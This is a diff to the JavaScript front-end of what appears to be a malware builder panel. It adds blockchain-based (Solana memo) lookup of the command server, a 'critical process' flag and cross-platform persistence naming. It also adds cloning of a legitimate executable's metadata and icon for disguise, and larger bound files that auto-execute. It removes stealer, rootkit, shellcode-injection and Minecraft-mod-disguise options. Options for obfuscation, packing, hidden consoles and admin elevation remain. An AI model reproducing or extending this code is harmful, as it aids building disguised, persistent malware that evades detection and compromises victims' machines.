@@ -15,6 +15,8 @@ const scriptsLink = document.getElementById("scripts-link");
 const pluginsLink = document.getElementById("plugins-link");
 const rawServerListCheckbox = document.getElementById("raw-server-list");
 const serverUrlInput = document.getElementById("server-url");
+const solMemoCheckbox = document.getElementById("sol-memo");
+const solSettings = document.getElementById("sol-settings");
 
 let currentServerVersion = null;
 
@@ -91,6 +93,9 @@ function saveFormSettings() {
       platforms: Array.from(document.querySelectorAll('input[name="platform"]')).map((el) => ({ value: el.value, checked: el.checked })),
       serverUrl: document.getElementById("server-url")?.value ?? "",
       rawServerList: document.getElementById("raw-server-list")?.checked ?? false,
+      solMemo: document.getElementById("sol-memo")?.checked ?? false,
+      solAddress: document.getElementById("sol-address")?.value ?? "",
+      solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value ?? "",
       outputName: document.getElementById("output-name")?.value ?? "",
       mutex: document.getElementById("mutex")?.value ?? "",
       disableMutex: document.querySelector('input[name="disable-mutex"]')?.checked ?? false,
@@ -103,25 +108,13 @@ function saveFormSettings() {
       garbleSeed: document.getElementById("garble-seed")?.value ?? "",
       enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
       upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
-      enableDonut: document.querySelector('input[name="enable-donut"]')?.checked ?? false,
-      enableTyphon: document.querySelector('input[name="enable-typhon"]')?.checked ?? false,
-      typhonVariant: document.getElementById("typhon-variant")?.value ?? "1",
-      typhonProcess: document.getElementById("typhon-process")?.value ?? "",
-      enableVault: document.querySelector('input[name="enable-vault"]')?.checked ?? false,
-      vaultRecipient: document.getElementById("vault-recipient")?.value ?? "",
-      jarMcVersion: document.getElementById("jar-mc-version")?.value ?? "1.21.4",
-      jarModId: document.getElementById("jar-mod-id")?.value ?? "",
-      jarModName: document.getElementById("jar-mod-name")?.value ?? "",
-      enableStealer: document.querySelector('input[name="enable-stealer"]')?.checked ?? false,
-      enableR77: document.querySelector('input[name="enable-r77"]')?.checked ?? false,
-      enableChaos: document.querySelector('input[name="enable-chaos"]')?.checked ?? false,
-      chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value ?? "both",
       sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
       enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
       persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
       startupName: document.getElementById("startup-name")?.value ?? "",
       hideConsole: document.querySelector('input[name="hide-console"]')?.checked ?? false,
       requireAdmin: document.querySelector('input[name="require-admin"]')?.checked ?? false,
+      criticalProcess: document.querySelector('input[name="critical-process"]')?.checked ?? false,
       assemblyTitle: document.getElementById("assembly-title")?.value ?? "",
       assemblyProduct: document.getElementById("assembly-product")?.value ?? "",
       assemblyCompany: document.getElementById("assembly-company")?.value ?? "",
@@ -152,6 +145,9 @@ function restoreFormSettings() {
     }
     if (s.serverUrl !== undefined) setVal("server-url", s.serverUrl);
     if (s.rawServerList !== undefined) setCb("#raw-server-list", s.rawServerList);
+    if (s.solMemo !== undefined) setCb("#sol-memo", s.solMemo);
+    if (s.solAddress !== undefined) setVal("sol-address", s.solAddress);
+    if (s.solRpcEndpoints !== undefined) setVal("sol-rpc-endpoints", s.solRpcEndpoints);
     if (s.outputName !== undefined) setVal("output-name", s.outputName);
     if (s.mutex !== undefined) setVal("mutex", s.mutex);
     if (s.disableMutex !== undefined) setCb('input[name="disable-mutex"]', s.disableMutex);
@@ -164,32 +160,6 @@ function restoreFormSettings() {
     if (s.garbleSeed !== undefined) setVal("garble-seed", s.garbleSeed);
     if (s.enableUpx !== undefined) setCb('input[name="enable-upx"]', s.enableUpx);
     if (s.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', s.upxStripHeaders);
-    if (s.enableDonut !== undefined) setCb('input[name="enable-donut"]', s.enableDonut);
-    if (s.enableTyphon !== undefined) setCb('input[name="enable-typhon"]', s.enableTyphon);
-    if (s.typhonVariant !== undefined) setVal("typhon-variant", s.typhonVariant);
-    if (s.typhonProcess !== undefined) setVal("typhon-process", s.typhonProcess);
-    if (s.enableVault !== undefined) setCb('input[name="enable-vault"]', s.enableVault);
-    if (s.vaultRecipient !== undefined) setVal("vault-recipient", s.vaultRecipient);
-    if (s.jarMcVersion !== undefined) setVal("jar-mc-version", s.jarMcVersion);
-    if (s.jarModId !== undefined) setVal("jar-mod-id", s.jarModId);
-    if (s.jarModName !== undefined) setVal("jar-mod-name", s.jarModName);
-    if (s.enableStealer !== undefined) setCb('input[name="enable-stealer"]', s.enableStealer);
-    if (s.enableR77 !== undefined) setCb('input[name="enable-r77"]', s.enableR77);
-    if (s.enableChaos !== undefined) setCb('input[name="enable-chaos"]', s.enableChaos);
-    if (s.chaosMode !== undefined) {
-      const el = document.querySelector(`input[name="chaos-mode"][value="${s.chaosMode}"]`);
-      if (el) el.checked = true;
-    }
-    const restoredExtension = document.getElementById("output-extension");
-    const jarContainer = document.getElementById("jar-settings-container");
-    if (restoredExtension && jarContainer) {
-      jarContainer.classList.toggle("hidden", restoredExtension.value !== ".jar");
-    }
-    const restoredChaos = document.querySelector('input[name="enable-chaos"]');
-    const chaosContainer = document.getElementById("chaos-settings-container");
-    if (restoredChaos && chaosContainer) {
-      chaosContainer.classList.toggle("hidden", !restoredChaos.checked);
-    }
     if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
     if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
     if (Array.isArray(s.persistenceMethods)) {
@@ -200,6 +170,7 @@ function restoreFormSettings() {
     if (s.startupName !== undefined) setVal("startup-name", s.startupName);
     if (s.hideConsole !== undefined) setCb('input[name="hide-console"]', s.hideConsole);
     if (s.requireAdmin !== undefined) setCb('input[name="require-admin"]', s.requireAdmin);
+    if (s.criticalProcess !== undefined) setCb('input[name="critical-process"]', s.criticalProcess);
     if (s.assemblyTitle !== undefined) setVal("assembly-title", s.assemblyTitle);
     if (s.assemblyProduct !== undefined) setVal("assembly-product", s.assemblyProduct);
     if (s.assemblyCompany !== undefined) setVal("assembly-company", s.assemblyCompany);
@@ -217,16 +188,6 @@ function restoreFormSettings() {
     if (restoredUpx && upxContainer) {
       upxContainer.classList.toggle("hidden", !restoredUpx.checked);
     }
-    const restoredTyphon = document.querySelector('input[name="enable-typhon"]');
-    const typhonContainer = document.getElementById("typhon-settings-container");
-    if (restoredTyphon && typhonContainer) {
-      typhonContainer.classList.toggle("hidden", !restoredTyphon.checked);
-    }
-    const restoredVault = document.querySelector('input[name="enable-vault"]');
-    const vaultContainer = document.getElementById("vault-settings-container");
-    if (restoredVault && vaultContainer) {
-      vaultContainer.classList.toggle("hidden", !restoredVault.checked);
-    }
   } catch (err) {
     console.error("Failed to restore form settings:", err);
   }
@@ -237,10 +198,19 @@ initAccordions();
 updateWindowsSectionVisibility();
 init();
 
+if (solMemoCheckbox && solSettings) {
+  solSettings.classList.toggle("hidden", !solMemoCheckbox.checked);
+}
+
 if (rawServerListCheckbox && serverUrlInput) {
   rawServerListCheckbox.addEventListener("change", () => {
     const isRaw = rawServerListCheckbox.checked;
     const current = serverUrlInput.value.trim();
+
+    if (isRaw && solMemoCheckbox) {
+      solMemoCheckbox.checked = false;
+      if (solSettings) solSettings.classList.add("hidden");
+    }
 
     if (isRaw) {
       if (current.startsWith("wss://")) {
@@ -260,12 +230,47 @@ if (rawServerListCheckbox && serverUrlInput) {
   });
 }
 
+if (solMemoCheckbox && solSettings) {
+  solMemoCheckbox.addEventListener("change", () => {
+    const isSol = solMemoCheckbox.checked;
+    solSettings.classList.toggle("hidden", !isSol);
+
+    if (isSol && rawServerListCheckbox) {
+      rawServerListCheckbox.checked = false;
+      if (serverUrlInput) {
+        serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(false);
+      }
+    }
+
+    if (isSol) {
+      const rpcField = document.getElementById("sol-rpc-endpoints");
+      if (rpcField && !rpcField.value.trim()) {
+        rpcField.value = [
+          "https://api.mainnet-beta.solana.com",
+          "https://solana-mainnet.gateway.tatum.io",
+          "https://go.getblock.us/86aac42ad4484f3c813079afc201451c",
+          "https://solana-rpc.publicnode.com",
+          "https://api.blockeden.xyz/solana/KeCh6p22EX5AeRHxMSmc",
+          "https://solana.drpc.org",
+          "https://solana.leorpc.com/?api_key=FREE",
+          "https://solana.api.onfinality.io/public",
+          "https://solana.api.pocket.network/",
+        ].join("\n");
+      }
+    }
+  });
+}
+
 const persistenceCheckbox = document.querySelector('input[name="enable-persistence"]');
 const persistenceMethodContainer = document.getElementById("persistence-method-container");
 const persistenceEmptyState = document.getElementById("persistence-empty-state");
 const persistenceWindowsSettings = document.getElementById("persistence-windows-settings");
 const persistenceLinuxSettings = document.getElementById("persistence-linux-settings");
 const persistenceMacSettings = document.getElementById("persistence-macos-settings");
+const persistenceStartupNameContainer = document.getElementById("persistence-startup-name-container");
+const startupNameMacosHint = document.getElementById("startup-name-macos-hint");
+const startupNameDefaultHint = document.getElementById("startup-name-default-hint");
+const startupNameError = document.getElementById("startup-name-error");
 const platformInputs = document.querySelectorAll('input[name="platform"]');
 
 function getSelectedPlatformFamilies() {
@@ -278,6 +283,20 @@ function getSelectedPlatformFamilies() {
     linux: selectedPlatforms.some((platform) => platform.startsWith("linux-")),
     darwin: selectedPlatforms.some((platform) => platform.startsWith("darwin-")),
   };
+}
+
+function validateStartupName() {
+  if (!startupNameError) return true;
+  const families = getSelectedPlatformFamilies();
+  const val = document.getElementById("startup-name")?.value.trim() || "";
+  if (families.darwin && val && !val.startsWith("com.")) {
+    startupNameError.textContent = "macOS requires the name to start with \"com.\" (e.g. com.apple.updater)";
+    startupNameError.classList.remove("hidden");
+    return false;
+  }
+  startupNameError.textContent = "";
+  startupNameError.classList.add("hidden");
+  return true;
 }
 
 function updatePersistenceSettingsVisibility() {
@@ -303,9 +322,19 @@ function updatePersistenceSettingsVisibility() {
   if (persistenceMacSettings) {
     persistenceMacSettings.classList.toggle("hidden", !families.darwin);
   }
+  if (persistenceStartupNameContainer) {
+    persistenceStartupNameContainer.classList.toggle("hidden", !hasSupportedFamily);
+  }
+  if (startupNameMacosHint) {
+    startupNameMacosHint.classList.toggle("hidden", !families.darwin);
+  }
+  if (startupNameDefaultHint) {
+    startupNameDefaultHint.classList.toggle("hidden", families.darwin);
+  }
   if (persistenceEmptyState) {
     persistenceEmptyState.classList.toggle("hidden", hasSupportedFamily);
   }
+  validateStartupName();
 }
 
 if (persistenceCheckbox && persistenceMethodContainer) {
@@ -316,6 +345,8 @@ platformInputs.forEach((input) => {
   input.addEventListener("change", updatePersistenceSettingsVisibility);
   input.addEventListener("change", updateWindowsSectionVisibility);
 });
+
+document.getElementById("startup-name")?.addEventListener("input", validateStartupName);
 
 updatePersistenceSettingsVisibility();
 
@@ -343,52 +374,6 @@ if (upxCheckbox && upxSettingsContainer) {
     } else {
       upxSettingsContainer.classList.add("hidden");
     }
-  });
-}
-
-const typhonCheckbox = document.querySelector('input[name="enable-typhon"]');
-const typhonSettingsContainer = document.getElementById("typhon-settings-container");
-if (typhonCheckbox && typhonSettingsContainer) {
-  typhonCheckbox.addEventListener("change", () => {
-    if (typhonCheckbox.checked) {
-      typhonSettingsContainer.classList.remove("hidden");
-      // Auto-enable Donut when Typhon is selected (Typhon needs shellcode)
-      const donutCb = document.querySelector('input[name="enable-donut"]');
-      if (donutCb && !donutCb.checked) {
-        donutCb.checked = true;
-      }
-    } else {
-      typhonSettingsContainer.classList.add("hidden");
-    }
-  });
-}
-
-const vaultCheckbox = document.querySelector('input[name="enable-vault"]');
-const vaultSettingsContainer = document.getElementById("vault-settings-container");
-if (vaultCheckbox && vaultSettingsContainer) {
-  vaultCheckbox.addEventListener("change", () => {
-    if (vaultCheckbox.checked) {
-      vaultSettingsContainer.classList.remove("hidden");
-    } else {
-      vaultSettingsContainer.classList.add("hidden");
-    }
-  });
-}
-
-const chaosCheckbox = document.querySelector('input[name="enable-chaos"]');
-const chaosSettingsContainer = document.getElementById("chaos-settings-container");
-if (chaosCheckbox && chaosSettingsContainer) {
-  chaosCheckbox.addEventListener("change", () => {
-    chaosSettingsContainer.classList.toggle("hidden", !chaosCheckbox.checked);
-  });
-}
-
-const outputExtensionSelect = document.getElementById("output-extension");
-const jarSettingsContainer = document.getElementById("jar-settings-container");
-if (outputExtensionSelect && jarSettingsContainer) {
-  outputExtensionSelect.addEventListener("change", () => {
-    const isJar = outputExtensionSelect.value === ".jar";
-    jarSettingsContainer.classList.toggle("hidden", !isJar);
   });
 }
 
@@ -426,8 +411,298 @@ if (iconClear) {
   });
 }
 
+function extractPEMetadata(buffer) {
+  const dv    = new DataView(buffer);
+  const bytes = new Uint8Array(buffer);
+
+  const u8  = (o) => dv.getUint8(o);
+  const u16 = (o) => dv.getUint16(o, true);
+  const u32 = (o) => dv.getUint32(o, true);
+  const alignUp = (n) => (n + 3) & ~3;
+
+  if (buffer.byteLength < 0x40) throw new Error("File too small");
+  if (u16(0) !== 0x5A4D) throw new Error("Not a PE file (missing MZ header)");
+
+  const peOff = u32(0x3C);
+  if (peOff + 24 > buffer.byteLength) throw new Error("Invalid PE offset");
+  if (u32(peOff) !== 0x4550) throw new Error("Not a PE file (missing PE signature)");
+
+  const numSections  = u16(peOff + 6);
+  const optHdrSize   = u16(peOff + 20);
+  const optMagic     = u16(peOff + 24);
+  const is64         = optMagic === 0x20B; // PE32+ vs PE32
+
+  const dataDirsOff = peOff + 24 + (is64 ? 112 : 96);
+  const rsrcRVA     = u32(dataDirsOff + 2 * 8); // index 2 = IMAGE_DIRECTORY_ENTRY_RESOURCE
+  if (rsrcRVA === 0) throw new Error("No resource section RVA");
+
+  const secTableOff = peOff + 24 + optHdrSize;
+  let rsrcRaw = 0;
+  for (let i = 0; i < numSections; i++) {
+    const s   = secTableOff + i * 40;
+    const va  = u32(s + 12);
+    const vsz = Math.max(u32(s + 8), u32(s + 16));
+    const raw = u32(s + 20);
+    if (rsrcRVA >= va && rsrcRVA < va + vsz) {
+      rsrcRaw = raw + (rsrcRVA - va);
+      break;
+    }
+  }
+  if (!rsrcRaw) throw new Error("Could not locate resource section raw data");
+
+  const rvaToOff = (rva) => rsrcRaw + (rva - rsrcRVA);
+
+  function rsrcDir(dirOff) {
+    if (dirOff + 16 > buffer.byteLength) return [];
+    const numNamed = u16(dirOff + 12);
+    const numId    = u16(dirOff + 14);
+    const total    = numNamed + numId;
+    const entries  = [];
+    for (let i = 0; i < total; i++) {
+      const e        = dirOff + 16 + i * 8;
+      if (e + 8 > buffer.byteLength) break;
+      const nameOrId  = u32(e);
+      const dataOrDir = u32(e + 4);
+      entries.push({
+        id:       (nameOrId  & 0x80000000) ? null : nameOrId,
+        isSubDir: (dataOrDir & 0x80000000) !== 0,
+        off:       dataOrDir & 0x7FFFFFFF,
+      });
+    }
+    return entries;
+  }
+
+  const WANT = new Set([3, 14, 16]);
+  const resources = {};
+  for (const te of rsrcDir(rsrcRaw)) {
+    if (te.id === null || !WANT.has(te.id) || !te.isSubDir) continue;
+    resources[te.id] = {};
+    for (const ne of rsrcDir(rsrcRaw + te.off)) {
+      if (!ne.isSubDir) continue;
+      const nameId = ne.id ?? 1;
+      resources[te.id][nameId] = [];
+      for (const le of rsrcDir(rsrcRaw + ne.off)) {
+        if (le.isSubDir) continue;
+        const deOff = rsrcRaw + le.off;
+        if (deOff + 8 > buffer.byteLength) continue;
+        const dataRVA  = u32(deOff);
+        const dataSize = u32(deOff + 4);
+        const dataOff  = rvaToOff(dataRVA);
+        if (dataOff + dataSize <= buffer.byteLength)
+          resources[te.id][nameId].push({ dataOff, dataSize });
+      }
+    }
+  }
+
+  function parseVersionStrings(absOff, size) {
+    const strings = {};
+    const end = absOff + size;
+    let pos = absOff;
+    if (pos + 6 > end) return strings;
+
+    const viLen    = u16(pos);
+    const viValLen = u16(pos + 2);
+    pos += 6;
+
+    while (pos + 1 < end && (u8(pos) | u8(pos + 1))) pos += 2;
+    pos = alignUp(pos + 2);
+    pos += viValLen;
+    pos = alignUp(pos);
+
+    const viEnd = Math.min(absOff + viLen, end);
+    while (pos + 6 < viEnd) {
+      const childLen = u16(pos);
+      if (childLen < 6) break;
+      const childEnd = Math.min(pos + childLen, viEnd);
+
+      let kp = pos + 6;
+      let key = "";
+      while (kp + 1 < childEnd && (u8(kp) | u8(kp + 1))) {
+        key += String.fromCharCode(u8(kp) | (u8(kp + 1) << 8));
+        kp += 2;
+      }
+      kp = alignUp(kp + 2);
+
+      if (key === "StringFileInfo") {
+        let sp = kp;
+        while (sp + 6 < childEnd) {
+          const stLen = u16(sp);
+          if (stLen < 6) break;
+          const stEnd = Math.min(sp + stLen, childEnd);
+          let tp = sp + 6;
+          while (tp + 1 < stEnd && (u8(tp) | u8(tp + 1))) tp += 2;
+          tp = alignUp(tp + 2);
+
+          while (tp + 6 < stEnd) {
+            const sLen    = u16(tp);
+            if (sLen < 6) break;
+            const sEnd    = Math.min(tp + sLen, stEnd);
+            const sValLen = u16(tp + 2);
+            let np = tp + 6;
+            let name = "";
+            while (np + 1 < sEnd && (u8(np) | u8(np + 1))) {
+              name += String.fromCharCode(u8(np) | (u8(np + 1) << 8));
+              np += 2;
+            }
+            np = alignUp(np + 2);
+            let val = "";
+            const valEnd = Math.min(np + sValLen * 2, sEnd);
+            while (np + 1 < valEnd && (u8(np) | u8(np + 1))) {
+              val += String.fromCharCode(u8(np) | (u8(np + 1) << 8));
+              np += 2;
+            }
+            if (name) strings[name] = val;
+            tp = alignUp(sEnd);
+          }
+          sp = alignUp(stEnd);
+        }
+      }
+      pos = alignUp(childEnd);
+    }
+    return strings;
+  }
+
+  function buildIco(groupOff, iconRes) {
+    if (groupOff + 6 > buffer.byteLength) return null;
+    const count = u16(groupOff + 4);
+    if (count === 0 || groupOff + 6 + count * 14 > buffer.byteLength) return null;
+
+    const grpEntries = [];
+    for (let i = 0; i < count; i++) {
+      const e = groupOff + 6 + i * 14;
+      grpEntries.push({
+        w: u8(e), h: u8(e + 1), cc: u8(e + 2),
+        planes: u16(e + 4), bits: u16(e + 6),
+        size: u32(e + 8), id: u16(e + 12),
+      });
+    }
+
+    const iconData = [];
+    for (const en of grpEntries) {
+      const rd = iconRes[en.id];
+      if (!rd || rd.length === 0) continue;
+      iconData.push({ en, dataOff: rd[0].dataOff, dataSize: rd[0].dataSize });
+    }
+    if (iconData.length === 0) return null;
+
+    let totalSize = 6 + iconData.length * 16;
+    for (const id of iconData) totalSize += id.dataSize;
+
+    const ico = new Uint8Array(totalSize);
+    const idv = new DataView(ico.buffer);
+    let p = 0;
+
+    idv.setUint16(p, 0, true); p += 2; // reserved
+    idv.setUint16(p, 1, true); p += 2; // type = ICO
+    idv.setUint16(p, iconData.length, true); p += 2;
+
+    let dataOffset = 6 + iconData.length * 16;
+    const entryStart = p;
+    let ep = entryStart;
+    p += iconData.length * 16;
+
+    for (const { en, dataOff, dataSize } of iconData) {
+      ico[ep]   = en.w;
+      ico[ep+1] = en.h;
+      ico[ep+2] = en.cc;
+      ico[ep+3] = 0;
+      idv.setUint16(ep + 4,  en.planes,  true);
+      idv.setUint16(ep + 6,  en.bits,    true);
+      idv.setUint32(ep + 8,  dataSize,   true);
+      idv.setUint32(ep + 12, dataOffset, true);
+      ep += 16;
+
+      ico.set(bytes.subarray(dataOff, dataOff + dataSize), dataOffset);
+      dataOffset += dataSize;
+    }
+
+    let bin = "";
+    for (let i = 0; i < ico.length; i++) bin += String.fromCharCode(ico[i]);
+    return btoa(bin);
+  }
+
+  const result = {};
+
+  if (resources[16]) {
+    const vd = Object.values(resources[16]).flat()[0];
+    if (vd) {
+      try { result.strings = parseVersionStrings(vd.dataOff, vd.dataSize); } catch (_) {}
+    }
+  }
+
+  if (resources[14] && resources[3]) {
+    const gd = Object.values(resources[14]).flat()[0];
+    if (gd) {
+      try { result.iconBase64 = buildIco(gd.dataOff, resources[3]); } catch (_) {}
+    }
+  }
+
+  return result;
+}
+
+const cloneExeUpload = document.getElementById("clone-exe-upload");
+const cloneExeLabel  = document.getElementById("clone-exe-label");
+const cloneExeStatus = document.getElementById("clone-exe-status");
+
+function setCloneStatus(msg, isError) {
+  if (!cloneExeStatus) return;
+  cloneExeStatus.textContent = msg;
+  cloneExeStatus.className   = "text-xs " + (isError ? "text-red-400" : "text-emerald-400");
+  cloneExeStatus.classList.remove("hidden");
+}
+
+if (cloneExeUpload) {
+  cloneExeUpload.addEventListener("change", () => {
+    const file = cloneExeUpload.files[0];
+    if (!file) return;
+
+    if (cloneExeLabel) cloneExeLabel.textContent = file.name;
+    setCloneStatus("Parsing...", false);
+
+    const reader = new FileReader();
+    reader.onload = () => {
+      try {
+        const meta = extractPEMetadata(reader.result);
+        const s    = meta.strings || {};
+
+        const fields = [
+          ["assembly-title",     s["FileDescription"]  ?? s["InternalName"] ?? ""],
+          ["assembly-product",   s["ProductName"]       ?? ""],
+          ["assembly-company",   s["CompanyName"]       ?? ""],
+          ["assembly-version",   s["FileVersion"]?.replace(/,\s*/g, ".") ?? s["ProductVersion"]?.replace(/,\s*/g, ".") ?? ""],
+          ["assembly-copyright", s["LegalCopyright"]    ?? s["LegalTrademarks"] ?? ""],
+        ];
+
+        let filled = 0;
+        for (const [id, val] of fields) {
+          const el = document.getElementById(id);
+          if (el && val) { el.value = val; filled++; }
+        }
+
+        if (meta.iconBase64) {
+          const decodedBytes = Math.floor(meta.iconBase64.length * 3 / 4);
+          if (decodedBytes <= 1024 * 1024) {
+            pendingIconBase64 = meta.iconBase64;
+            if (iconLabel) iconLabel.textContent = file.name + " (cloned icon)";
+            if (iconClear)  iconClear.classList.remove("hidden");
+            setCloneStatus(`Cloned ${filled} metadata field(s) + icon`, false);
+          } else {
+            setCloneStatus(`Cloned ${filled} metadata field(s) (icon too large, skipped)`, false);
+          }
+        } else {
+          setCloneStatus(filled > 0 ? `Cloned ${filled} metadata field(s), no icon found` : "No metadata found in file", !filled);
+        }
+      } catch (err) {
+        setCloneStatus("Error: " + err.message, true);
+      }
+      cloneExeUpload.value = "";
+    };
+    reader.readAsArrayBuffer(file);
+  });
+}
+
 const MAX_BIND_FILES = 5;
-const MAX_BIND_FILE_BYTES = 10 * 1024 * 1024; // 10 MB
+const MAX_BIND_FILE_BYTES = 50 * 1024 * 1024; // 50 MB
 
 let boundFiles = []; // { name, base64, targetOS: string[], execute: boolean }
 
@@ -521,7 +796,7 @@ if (bindFileInput) {
       return;
     }
     if (file.size > MAX_BIND_FILE_BYTES) {
-      alert(`Each bound file must be under 10 MB. "${file.name}" is too large.`);
+      alert(`Each bound file must be under 50 MB. "${file.name}" is too large.`);
       return;
     }
     const safeName = sanitizeBindName(file.name);
@@ -541,58 +816,6 @@ if (bindFileInput) {
   });
 }
 
-const MAX_JAR_MODS = 3;
-let jarBoundMods = []; // { name, base64 }
-
-const jarBindFileInput = document.getElementById("jar-bind-file-input");
-const jarBoundModsList = document.getElementById("jar-bound-mods-list");
-const jarBindAddLabel = document.getElementById("jar-bind-add-label");
-
-function renderJarBoundMods() {
-  if (!jarBoundModsList) return;
-  jarBoundModsList.innerHTML = "";
-  jarBoundMods.forEach((entry, idx) => {
-    const div = document.createElement("div");
-    div.className = "flex items-center gap-2 p-2 bg-slate-800/60 border border-slate-700 rounded-lg text-xs";
-    div.innerHTML = `
-      <i class="fa-brands fa-java text-green-400 shrink-0"></i>
-      <span class="text-slate-200 truncate flex-1">${entry.name}</span>
-      <button type="button" class="jar-mod-remove text-red-400 hover:text-red-300 px-1" data-idx="${idx}" title="Remove">
-        <i class="fa-solid fa-xmark"></i>
-      </button>`;
-    div.querySelector(".jar-mod-remove").addEventListener("click", () => {
-      jarBoundMods.splice(idx, 1);
-      renderJarBoundMods();
-      if (jarBindAddLabel) jarBindAddLabel.classList.toggle("hidden", jarBoundMods.length >= MAX_JAR_MODS);
-    });
-    jarBoundModsList.appendChild(div);
-  });
-}
-
-if (jarBindFileInput) {
-  jarBindFileInput.addEventListener("change", () => {
-    const file = jarBindFileInput.files[0];
-    jarBindFileInput.value = "";
-    if (!file) return;
-    if (jarBoundMods.length >= MAX_JAR_MODS) {
-      alert(`Maximum ${MAX_JAR_MODS} JAR mods can be bound.`);
-      return;
-    }
-    const safeName = sanitizeBindName(file.name);
-    if (jarBoundMods.some((m) => m.name === safeName)) {
-      alert(`A mod named "${safeName}" is already in the list.`);
-      return;
-    }
-    const reader = new FileReader();
-    reader.onload = () => {
-      jarBoundMods.push({ name: safeName, base64: reader.result.split(",")[1] });
-      renderJarBoundMods();
-      if (jarBindAddLabel) jarBindAddLabel.classList.toggle("hidden", jarBoundMods.length >= MAX_JAR_MODS);
-    };
-    reader.readAsDataURL(file);
-  });
-}
-
 async function init() {
   try {
     updateServerUrlPlaceholder();
@@ -601,7 +824,7 @@ async function init() {
     });
 
     if (!res.ok) {
-      window.location.href = "/login.html";
+      window.location.href = "/";
       return;
     }
 
@@ -665,7 +888,7 @@ async function init() {
     await loadSavedBuilds();
   } catch (err) {
     console.error("Failed to fetch user info:", err);
-    window.location.href = "/login.html";
+    window.location.href = "/";
   }
 }
 
@@ -699,6 +922,11 @@ form?.addEventListener("submit", async (e) => {
     return;
   }
 
+  if (!validateStartupName()) {
+    document.getElementById("startup-name")?.focus();
+    return;
+  }
+
   const serverUrl = form.querySelector("#server-url").value.trim();
   const rawServerList = form.querySelector("#raw-server-list")?.checked || false;
   const mutex = form.querySelector("#mutex")?.value.trim() || "";
@@ -710,10 +938,11 @@ form?.addEventListener("submit", async (e) => {
     'input[name="enable-persistence"]',
   ).checked;
   const hasWindowsTarget = platforms.some((platform) => platform.startsWith("windows-"));
+  const hasPersistentUnixTarget = platforms.some((p) => p.startsWith("linux-") || p.startsWith("darwin-"));
   const persistenceMethods = hasWindowsTarget
     ? Array.from(form.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value)
     : undefined;
-  const startupNameVal = hasWindowsTarget
+  const startupNameVal = (hasWindowsTarget || hasPersistentUnixTarget)
     ? (form.querySelector("#startup-name")?.value.trim() || "")
     : "";
   const hideConsole = form.querySelector(
@@ -733,6 +962,7 @@ form?.addEventListener("submit", async (e) => {
   const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
   const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";
   const requireAdmin = form.querySelector('input[name="require-admin"]')?.checked || false;
+  const criticalProcess = form.querySelector('input[name="critical-process"]')?.checked || false;
   const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
   const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
   const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
@@ -741,6 +971,9 @@ form?.addEventListener("submit", async (e) => {
     platforms,
     serverUrl: serverUrl || undefined,
     rawServerList,
+    solMemo: document.getElementById("sol-memo")?.checked || false,
+    solAddress: document.getElementById("sol-address")?.value.trim() || undefined,
+    solRpcEndpoints: document.getElementById("sol-rpc-endpoints")?.value.trim() || undefined,
     mutex: disableMutex ? "" : mutex || undefined,
     disableMutex,
     stripDebug,
@@ -748,7 +981,7 @@ form?.addEventListener("submit", async (e) => {
     obfuscate,
     enablePersistence,
     persistenceMethods: enablePersistence && hasWindowsTarget ? (persistenceMethods && persistenceMethods.length > 0 ? persistenceMethods : ['startup']) : undefined,
-    startupName: enablePersistence && hasWindowsTarget && startupNameVal ? startupNameVal : undefined,
+    startupName: enablePersistence && (hasWindowsTarget || hasPersistentUnixTarget) && startupNameVal ? startupNameVal : undefined,
     hideConsole,
     noPrinting,
     outputName: outputNameVal || undefined,
@@ -761,26 +994,12 @@ form?.addEventListener("submit", async (e) => {
     assemblyVersion: assemblyVersion || undefined,
     assemblyCopyright: assemblyCopyright || undefined,
     requireAdmin,
+    criticalProcess,
     outputExtension,
     sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
-    enableDonut: form.querySelector('input[name="enable-donut"]')?.checked || false,
-    enableTyphon: form.querySelector('input[name="enable-typhon"]')?.checked || false,
-    typhonVariant: document.getElementById("typhon-variant")?.value || "1",
-    typhonProcess: document.getElementById("typhon-process")?.value?.trim() || undefined,
-    enableVault: form.querySelector('input[name="enable-vault"]')?.checked || false,
-    vaultRecipient: document.getElementById("vault-recipient")?.value?.trim() || undefined,
-    enableJar: outputExtension === ".jar",
-    jarMcVersion: document.getElementById("jar-mc-version")?.value || "1.21.4",
-    jarModId: document.getElementById("jar-mod-id")?.value?.trim() || undefined,
-    jarModName: document.getElementById("jar-mod-name")?.value?.trim() || undefined,
-    jarBoundMods: jarBoundMods.length > 0 ? jarBoundMods.map((m) => ({ name: m.name, data: m.base64 })) : undefined,
-    enableStealer: form.querySelector('input[name="enable-stealer"]')?.checked || false,
-    enableR77: form.querySelector('input[name="enable-r77"]')?.checked || false,
-    enableChaos: form.querySelector('input[name="enable-chaos"]')?.checked || false,
-    chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value || "both",
     boundFiles: boundFiles.length > 0
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
@@ -828,6 +1047,10 @@ async function startBuild(config) {
   buildBtn.disabled = true;
   buildBtn.innerHTML =
     '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';
+  if (buildUpdateAllBtn) {
+    buildUpdateAllBtn.disabled = true;
